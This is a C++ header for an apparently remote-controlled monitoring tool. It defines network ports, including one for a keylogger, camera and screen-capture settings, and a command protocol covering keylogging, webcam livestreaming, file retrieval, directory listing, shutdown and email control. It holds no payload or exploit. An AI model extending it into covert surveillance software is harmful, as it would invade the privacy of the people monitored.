#pragma once

#include <string>

// Network configuration
constexpr int COMMAND_PORT = 8888;
constexpr int DATA_PORT = 8889;
constexpr int LIVESTREAM_PORT = 8890;
constexpr int KEYLOGGER_PORT = 8891;

// Buffer sizes
constexpr int COMMAND_BUFFER_SIZE = 4096;
constexpr int DATA_CHUNK_SIZE = 1 * 1024 * 1024;
constexpr int DATA_HEADER_SIZE = 24;
constexpr int MAX_FRAME_SIZE = 10000000;
constexpr int PROCESS_BUFFER_SIZE = 10240;
constexpr int MAIL_BUFFER_SIZE = 8192;
constexpr int MAX_FILE_SIZE = 10 * 1024 * 1024;

// File transfer limits
constexpr size_t MAX_ALLOWED_FILE_SIZE = 500 * 1024 * 1024; // 500MB limit for streaming file transfer

// Connection settings
constexpr int MAX_CONNECTION_ATTEMPTS = 5;
constexpr int RETRY_DELAY_MS = 1000;
constexpr int SOCKET_LISTEN_QUEUE = 3;
constexpr int MAIL_TIMEOUT_MS = 3000;

// Camera settings
constexpr int CAMERA_WIDTH = 1280;
constexpr int CAMERA_HEIGHT = 720;
constexpr int CAMERA_FPS = 60;
constexpr int JPEG_QUALITY = 90;

// Timing settings
constexpr int FRAME_DELAY_MS = 33;
constexpr int THREAD_SLEEP_MS = 100;
constexpr int EMAIL_CHECK_INTERVAL_MS = 30000;
constexpr int COMMAND_RETRY_DELAY_MS = 1000;
constexpr int CLIENT_STARTUP_DELAY_MS = 2000;
constexpr int OPENCV_WINDOW_CHECK_MS = 50;

// System limits
constexpr int MAX_CAMERA_INDEX = 3;
constexpr int LOG_FRAME_INTERVAL = 30;
constexpr int MAX_CONSECUTIVE_ERRORS = 10;
constexpr int LIMIT_APP_DISPLAY = 25;
constexpr int LIMIT_PROCESS_DISPLAY = 25;

// Screen capture settings
constexpr int SCREEN_CAPTURE_JPEG_QUALITY = 100;
constexpr int SCREEN_CAPTURE_PNG_COMPRESSION = 3;
constexpr int MAX_SCREEN_DIMENSION = 10000;

// Command types enumeration for data transfer
enum class DataTransferCommand : uint16_t
{
	// Generic data transfer
	DATA = 0x0001,
	FILE = 0x0002,

	// System control commands
	PROCESS_LIST = 0x0010,
	APP_LIST = 0x0011,
	APP_START = 0x0012,
	APP_STOP = 0x0013,
	START_SERVICE = 0x0014,
	STOP_SERVICE = 0x0015,
	SHUTDOWN = 0x0016,
	RESTART = 0x0017,

	// Monitoring & capture commands
	KEYLOG = 0x0020,
	STOP_KEYLOG = 0x0021,
	SCREEN_CAPTURE = 0x0022,
	LIVESTREAM = 0x0023,
	STOP_LIVESTREAM = 0x0024,

	// File operations
	GET_FILE = 0x0030,
	LIST_DIR = 0x0031,

	// Email operations
	ENABLE_MAIL = 0x0040,
	DISABLE_MAIL = 0x0041,
	MAIL_STATUS = 0x0042,

	// Connection control
	EXIT = 0x0050,

	// Response/Status codes
	SUCCESS = 0x1000,
	NETWORK_ERROR = 0x1001,
	PROGRESS = 0x1002,

	// Reserved for future use
	RESERVED = 0xFFFF
};

// Utility function to convert command enum to string for logging
inline const char *commandToString(DataTransferCommand cmd)
{
	switch (cmd)
	{
	case DataTransferCommand::DATA:
		return "DATA";
	case DataTransferCommand::FILE:
		return "FILE";
	case DataTransferCommand::PROCESS_LIST:
		return "PROCESS_LIST";
	case DataTransferCommand::APP_LIST:
		return "APP_LIST";
	case DataTransferCommand::APP_START:
		return "APP_START";
	case DataTransferCommand::APP_STOP:
		return "APP_STOP";
	case DataTransferCommand::START_SERVICE:
		return "START";
	case DataTransferCommand::STOP_SERVICE:
		return "STOP";
	case DataTransferCommand::SHUTDOWN:
		return "SHUTDOWN";
	case DataTransferCommand::RESTART:
		return "RESTART";
	case DataTransferCommand::KEYLOG:
		return "KEYLOG";
	case DataTransferCommand::STOP_KEYLOG:
		return "STOPKEYLOG";
	case DataTransferCommand::SCREEN_CAPTURE:
		return "SCREEN_CAPTURE";
	case DataTransferCommand::LIVESTREAM:
		return "LIVESTREAM";
	case DataTransferCommand::STOP_LIVESTREAM:
		return "STOPLIVESTREAM";
	case DataTransferCommand::GET_FILE:
		return "GET";
	case DataTransferCommand::LIST_DIR:
		return "LS";
	case DataTransferCommand::ENABLE_MAIL:
		return "ENABLEMAIL";
	case DataTransferCommand::DISABLE_MAIL:
		return "DISABLEMAIL";
	case DataTransferCommand::MAIL_STATUS:
		return "MAILSTATUS";
	case DataTransferCommand::EXIT:
		return "EXIT";
	case DataTransferCommand::SUCCESS:
		return "SUCCESS";
	case DataTransferCommand::NETWORK_ERROR:
		return "ERROR";
	case DataTransferCommand::PROGRESS:
		return "PROGRESS";
	default:
		return "UNKNOWN";
	}
}

// Utility function to convert string command to enum
inline DataTransferCommand stringToCommand(const std::string &str)
{
	if (str == "DATA")
		return DataTransferCommand::DATA;
	if (str == "FILE")
		return DataTransferCommand::FILE;
	if (str == "PROCESS_LIST")
		return DataTransferCommand::PROCESS_LIST;
	if (str == "APP_LIST")
		return DataTransferCommand::APP_LIST;
	if (str == "APP_START")
		return DataTransferCommand::APP_START;
	if (str == "APP_STOP")
		return DataTransferCommand::APP_STOP;
	if (str == "START")
		return DataTransferCommand::START_SERVICE;
	if (str == "STOP")
		return DataTransferCommand::STOP_SERVICE;
	if (str == "SHUTDOWN")
		return DataTransferCommand::SHUTDOWN;
	if (str == "RESTART")
		return DataTransferCommand::RESTART;
	if (str == "KEYLOG")
		return DataTransferCommand::KEYLOG;
	if (str == "STOPKEYLOG")
		return DataTransferCommand::STOP_KEYLOG;
	if (str == "SCREEN_CAPTURE")
		return DataTransferCommand::SCREEN_CAPTURE;
	if (str == "LIVESTREAM")
		return DataTransferCommand::LIVESTREAM;
	if (str == "STOPLIVESTREAM")
		return DataTransferCommand::STOP_LIVESTREAM;
	if (str == "GET")
		return DataTransferCommand::GET_FILE;
	if (str == "LS")
		return DataTransferCommand::LIST_DIR;
	if (str == "ENABLEMAIL")
		return DataTransferCommand::ENABLE_MAIL;
	if (str == "DISABLEMAIL")
		return DataTransferCommand::DISABLE_MAIL;
	if (str == "MAILSTATUS")
		return DataTransferCommand::MAIL_STATUS;
	if (str == "EXIT")
		return DataTransferCommand::EXIT;
	if (str == "SUCCESS")
		return DataTransferCommand::SUCCESS;
	if (str == "ERROR")
		return DataTransferCommand::NETWORK_ERROR;
	if (str == "PROGRESS")
		return DataTransferCommand::PROGRESS;
	return DataTransferCommand::DATA; // Default fallback
}